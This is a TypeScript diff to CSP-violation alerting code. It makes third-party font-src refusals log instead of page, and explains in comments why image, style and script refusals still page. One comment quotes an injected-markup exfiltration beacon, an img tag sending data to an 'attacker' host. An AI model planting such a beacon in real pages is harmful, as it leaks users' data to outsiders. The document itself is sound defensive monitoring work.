@@ -395,7 +395,7 @@ function reportedSurface(document: string): ClientErrorSurface {
 }
 
 export type CspPageDecision =
-  | { page: false; why: "report-only" | "extension" }
+  | { page: false; why: "report-only" | "extension" | "injected-passive" }
   | {
       page: true;
       key: string;
@@ -405,14 +405,67 @@ export type CspPageDecision =
     };
 
 /**
+ * The passive directive whose third-party refusal is treated as likely-injected and
+ * LOGGED rather than paged (#3417). ONLY `font-src`: a font from a host no Slate page
+ * requests blocked nothing a lead needed and is almost always an extension, and a font is
+ * not a data-exfiltration channel the way an image or stylesheet is.
+ *
+ * `img-src`, `style-src` and `media-src` are deliberately NOT here even though an
+ * extension often trips them: a blocked third-party image, stylesheet or media request can
+ * be an injected-markup exfiltration beacon (`<img src=https://attacker/?d=...>`, CSS
+ * exfil), so a refusal there may signal an injection attempt and keeps paging. The ACTIVE
+ * and security-critical directives (script-src, connect-src, frame-src, object-src ...)
+ * keep paging for the same reason, and so does a refusal of Slate's own origin or any
+ * refusal that names a script source.
+ *
+ * This logs and does NOT page, rather than trying to page only when "several distinct
+ * visitors" hit the host: the only per-visitor signal a CSP report carries is the client
+ * IP, which a shared NAT collapses and a rotating caller inflates, so an inline
+ * distinct-visitor count is neither reliable nor un-gameable on a public endpoint. A real
+ * widespread gap (a font Slate newly uses but forgot to allow) still shows in the logs by
+ * host, and detecting it as a page belongs in a monitor-lane aggregate off the hot path
+ * (#3598), not here.
+ */
+const CSP_INJECTED_PASSIVE_DIRECTIVES = new Set(["font-src"]);
+
+/** The host of a (redacted) URL, or null when it is not a readable absolute URL. */
+function hostOf(value: string): string | null {
+  try {
+    return new URL(value).host || null;
+  } catch {
+    return null;
+  }
+}
+
+/**
+ * Whether a violation is the injected passive third-party class (#3417): true when it is
+ * logged rather than paged, false when it pages at once. False on any doubt, which pages,
+ * the safe direction. True needs all of: no named source, a concrete third-party origin,
+ * a passive directive, and a host that is NOT the page's own.
+ */
+function isInjectedPassive(directive: string, v: ViolationSummary, blocked: BlockedResource): boolean {
+  if (!CSP_INJECTED_PASSIVE_DIRECTIVES.has(directive)) return false;
+  if (v.sourceNamed) return false; // a named script is our own code; it pages
+  if (blocked.kind !== "origin") return false; // inline/eval/data/blob/unreadable page at once
+  const blockedHost = hostOf(blocked.origin);
+  const documentHost = hostOf(v.document);
+  if (blockedHost === null || documentHost === null) return false; // cannot prove third-party -> page
+  return blockedHost !== documentHost; // Slate's own origin is a real gap and pages; a third-party does not
+}
+
+/**
  * Whether a violation pages, and under which key (#2575, Dan 2026-10-02).
  *
  * Enforced, a violation means something was refused for a real person, so it
- * pages. Two refusals are not Slate's: a report only report blocked nothing, and
- * an extension's own resource is the person's browser rather than Slate's page.
- * Both are still logged. A report that does not state its disposition pages,
- * because the only policy Slate serves now enforces and Safari's legacy body never
- * says.
+ * pages. Three refusals do not page (all still logged): a report only report blocked
+ * nothing, an extension's own resource is the person's browser rather than Slate's page,
+ * and a passive third-party resource (the `injected-passive` reason below). A report that
+ * does not state its disposition pages, because the only policy Slate serves now enforces
+ * and Safari's legacy body never says.
+ *
+ * A THIRD non-paging reason, `injected-passive` (#3417): a passive third-party resource
+ * no Slate page requests, with no named source, is almost always an extension and is
+ * logged rather than paged (see isInjectedPassive).
  *
  * Keyed on the DIRECTIVE, not one key for the whole policy: a stray image refusal
  * must not silence a script refusal behind it for the cooldown's length (L707).
@@ -421,12 +474,14 @@ export function cspViolationPage(v: ViolationSummary): CspPageDecision {
   if (v.disposition === "report") return { page: false, why: "report-only" };
   if (v.fromExtension) return { page: false, why: "extension" };
   const directive = cspAlertDirective(v.directive);
+  const blocked = blockedResource(v.blocked);
+  if (isInjectedPassive(directive, v, blocked)) return { page: false, why: "injected-passive" };
   return {
     page: true,
     key: `${CSP_VIOLATION_KEY_PREFIX}:${directive}`,
     directive,
     surface: reportedSurface(v.document),
-    blocked: blockedResource(v.blocked),
+    blocked,
   };
 }
 
